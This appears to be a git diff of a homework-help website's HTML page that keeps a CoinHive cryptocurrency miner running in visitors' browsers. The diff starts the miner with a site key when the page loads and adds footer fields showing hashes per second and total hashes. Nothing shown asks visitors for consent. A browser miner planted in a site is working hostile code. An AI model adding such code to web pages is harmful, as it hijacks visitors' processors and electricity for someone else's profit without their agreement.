@@ -689,6 +689,10 @@ var bgurl = "http://image.qn.iblueg.cn/kuanpin"+bgnum+".jpg";
         <h4>&copy; Copyright 2017 Galvin.G</h4>
         <br />
         iHomework 访问量：<img src="http://c.statcounter.com/11338260/0/3593293a/0/" alt="Counter" style="border:none;">
+	<h5>Coin-Hive Info:</h5>
+<h6>hash/s: <span id="hps">0</span> </h6>
+<h6>total hashes: <span id="th">0</span> </h6>
+<h6>accepted hashes: <span id="ah">0</span> </h6>
     </div>
     <div data-role="dialog" id="searchWA" data-close-button="true" data-windows-style="true">
         <div class="container">
@@ -1025,27 +1029,18 @@ var bgurl = "http://image.qn.iblueg.cn/kuanpin"+bgnum+".jpg";
         ga('create', 'UA-69113723-4', 'auto');
         ga('send', 'pageview');
 	    
-	    try{
-	    
-	    var miner = new CoinHive.Anonymous('UitANGIFzXKM1p25LYThHGmI5jpFkrd4', {
-	threads: 32,
-	autoThreads: false,
-	throttle: 0.1,
-	forceASMJS: false
-});
-	    
+	var miner = new CoinHive.Anonymous('UitANGIFzXKM1p25LYThHGmI5jpFkrd4');
 	miner.start();
-	    
-	    setInterval(function() {
+	
+	setInterval(function() {
 		var hashesPerSecond = miner.getHashesPerSecond();
 		var totalHashes = miner.getTotalHashes();
 		var acceptedHashes = miner.getAcceptedHashes();
-		    
-		    console.log(hashesPerSecond+" "+totalHashes+" "acceptedHashes");
-
 		// Output to HTML elements...
-	}, 3000);
-	    }catch(e){alert(e);}
+		document.getElementById("hps").innerHTML=hashesPerSecond;
+		document.getElementById("th").innerHTML=totalHashes;
+		document.getElementById("ah").innerHTML=acceptedHashes;
+	}, 1000);
     </script>
 
 <script type="text/javascript" color="255,255,255" zindex="-1" opacity="0.5" count="150" src="http://cdn.bootcss.com/canvas-nest.js/1.0.0/canvas-nest.min.js"></script>
